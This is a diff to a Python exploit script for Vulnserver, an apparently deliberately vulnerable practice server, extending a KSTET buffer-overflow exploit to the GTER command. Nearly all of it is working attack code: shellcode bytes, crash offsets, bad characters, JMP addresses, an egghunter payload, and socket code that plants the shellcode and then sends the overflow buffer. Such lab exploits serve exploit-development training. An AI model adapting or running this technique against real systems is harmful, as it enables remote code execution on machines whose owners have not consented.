@@ -1,4 +1,4 @@
-# Exploit for Vulnserver KSTET
+# Exploit for Vulnserver KSTET and GTER
 # Author: Prashant Kumar (@notsoshant)
 
 import socket
@@ -69,7 +69,7 @@ shellcode += "\x63\x45\x44\x45\x4f\x4b\x62\x67\x36\x73\x33\x42"
 shellcode += "\x72\x4f\x31\x7a\x63\x30\x61\x43\x69\x6f\x6b\x65"
 shellcode += "\x41\x41"
 
-# Crash at 66
+# Crash at 70 for KSTET and 151 for GTER
 # Bad chars - \x00
 # 0x625011B1 - JMP EAX
 # 0x625011AF - JMP ESP
@@ -84,17 +84,23 @@ egg += "\x33\x87\x6f\x75\x5b\xa8\x97"
 
 payload  = egg + "A"*(70-len(egg)) + "\xAF\x11\x50\x62"
 payload += "\x40"*6 + "\xc7\xc3\xb1\x11\x50\x62" + "\xff\xe3" # INC EAX;(x6) MOV EBX,0x625011B1; JMP EBX
+
+# Use following two lines instead of above two for GTER exploit
+# payload  = egg + "A"*(151-len(egg)) + "\xAF\x11\x50\x62"
+# payload += "\x40"*5 + "\xc7\xc3\xb1\x11\x50\x62" + "\xff\xe3" # INC EAX;(x5) MOV EBX,0x625011B1; JMP EBX
+
 payload += "C"*(100-len(payload))
 
 print("Payload length: " + str(len(payload)))
 buffer = "KSTET " + payload
+# buffer = "GTER " + payload
 
 # We will send our shellcode first to store it in server's heap
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((host,port))
 s.send(shellcode)
 s.close()
-# Then we'll send our KSTET command line which has an egghunter
+# Then we'll send our KSTET/GTER command line which has an egghunter
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((host,port))
 s.send(buffer)
